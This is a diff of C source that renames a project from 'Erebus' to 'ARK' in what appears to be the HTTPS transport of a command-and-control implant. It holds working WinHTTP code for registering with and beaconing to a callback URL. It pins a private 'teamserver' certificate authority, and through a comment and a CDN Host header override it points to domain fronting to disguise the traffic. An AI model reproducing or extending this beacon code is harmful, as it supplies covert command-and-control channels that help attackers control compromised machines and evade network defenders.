@@ -6,8 +6,8 @@
 #include <stdlib.h>
 #include <string.h>
 
-#include "erebus/config.h"
-#include "erebus/transport.h"
+#include "ark/config.h"
+#include "ark/transport.h"
 
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "crypt32.lib")
@@ -22,17 +22,17 @@ typedef struct https_ctx {
 } https_ctx;
 
 static PCCERT_CONTEXT load_pinned_ca(void) {
-    if (EREBUS_CA_CERT_PEM[0] == '\0') return NULL;
+    if (ARK_CA_CERT_PEM[0] == '\0') return NULL;
 
     DWORD der_len = 0;
-    if (!CryptStringToBinaryA(EREBUS_CA_CERT_PEM, 0, CRYPT_STRING_BASE64, NULL, &der_len, NULL, NULL) || der_len == 0)
+    if (!CryptStringToBinaryA(ARK_CA_CERT_PEM, 0, CRYPT_STRING_BASE64, NULL, &der_len, NULL, NULL) || der_len == 0)
         return NULL;
 
     BYTE *der = (BYTE *)malloc(der_len);
     if (!der) return NULL;
 
     PCCERT_CONTEXT ca = NULL;
-    if (CryptStringToBinaryA(EREBUS_CA_CERT_PEM, 0, CRYPT_STRING_BASE64, der, &der_len, NULL, NULL)) {
+    if (CryptStringToBinaryA(ARK_CA_CERT_PEM, 0, CRYPT_STRING_BASE64, der, &der_len, NULL, NULL)) {
         ca = CertCreateCertificateContext(X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, der, der_len);
     }
     free(der);
@@ -142,9 +142,9 @@ out:
 }
 
 static int https_post(https_ctx *ctx, const wchar_t *path, const uint8_t *body, size_t body_len, uint8_t **resp, size_t *resp_len) {
-    if (ctx->use_tls && EREBUS_CA_CERT_PEM[0] == '\0') return 0;
+    if (ctx->use_tls && ARK_CA_CERT_PEM[0] == '\0') return 0;
 
-    HINTERNET session = WinHttpOpen(L"Erebus/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
+    HINTERNET session = WinHttpOpen(L"ARK/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
     if (!session) return 0;
 
     HINTERNET connect = WinHttpConnect(session, ctx->host, ctx->port, 0);
@@ -155,7 +155,7 @@ static int https_post(https_ctx *ctx, const wchar_t *path, const uint8_t *body, 
         WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
     if (!request) { WinHttpCloseHandle(connect); WinHttpCloseHandle(session); return 0; }
 
-    if (ctx->use_tls && EREBUS_CA_CERT_PEM[0] != '\0') {
+    if (ctx->use_tls && ARK_CA_CERT_PEM[0] != '\0') {
         /*
          * Private teamserver CA is not in the system trust store; domain fronting
          * may make CN/SAN mismatch. Ignore only system CA + CN — never ignore
@@ -237,40 +237,40 @@ static void parse_url(const char *url, https_ctx *ctx) {
     }
     MultiByteToWideChar(CP_UTF8, 0, host, -1, ctx->host, 256);
 
-    if (EREBUS_CDN_DOMAIN[0]) {
+    if (ARK_CDN_DOMAIN[0]) {
         wchar_t hdr[300];
-        swprintf(hdr, 300, L"Host: %S\r\n", EREBUS_CDN_DOMAIN);
+        swprintf(hdr, 300, L"Host: %S\r\n", ARK_CDN_DOMAIN);
         wcsncpy(ctx->cdn_host, hdr, 255);
     }
 }
 
-static int https_register(erebus_transport *t, const uint8_t *req, size_t req_len, uint8_t **resp, size_t *resp_len) {
+static int https_register(ark_transport *t, const uint8_t *req, size_t req_len, uint8_t **resp, size_t *resp_len) {
     https_ctx *ctx = (https_ctx *)t->ctx;
     return https_post(ctx, ctx->path_register, req, req_len, resp, resp_len);
 }
 
-static int https_beacon(erebus_transport *t, const uint8_t *req, size_t req_len, uint8_t **resp, size_t *resp_len) {
+static int https_beacon(ark_transport *t, const uint8_t *req, size_t req_len, uint8_t **resp, size_t *resp_len) {
     https_ctx *ctx = (https_ctx *)t->ctx;
     return https_post(ctx, ctx->path_beacon, req, req_len, resp, resp_len);
 }
 
-static void https_destroy(erebus_transport *t) {
+static void https_destroy(ark_transport *t) {
     free(t->ctx);
     free(t);
 }
 
-static const erebus_transport_ops https_ops = {
+static const ark_transport_ops https_ops = {
     https_register,
     https_beacon,
     https_destroy,
     NULL, /* set_session_id: HTTPS does not store session in transport ctx */
 };
 
-int erebus_transport_create_https(erebus_transport **out) {
-    erebus_transport *t = (erebus_transport *)calloc(1, sizeof(*t));
+int ark_transport_create_https(ark_transport **out) {
+    ark_transport *t = (ark_transport *)calloc(1, sizeof(*t));
     https_ctx *ctx = (https_ctx *)calloc(1, sizeof(*ctx));
     if (!t || !ctx) { free(t); free(ctx); return 0; }
-    parse_url(EREBUS_CALLBACK_URL, ctx);
+    parse_url(ARK_CALLBACK_URL, ctx);
     t->ops = &https_ops;
     t->ctx = ctx;
     *out = t;
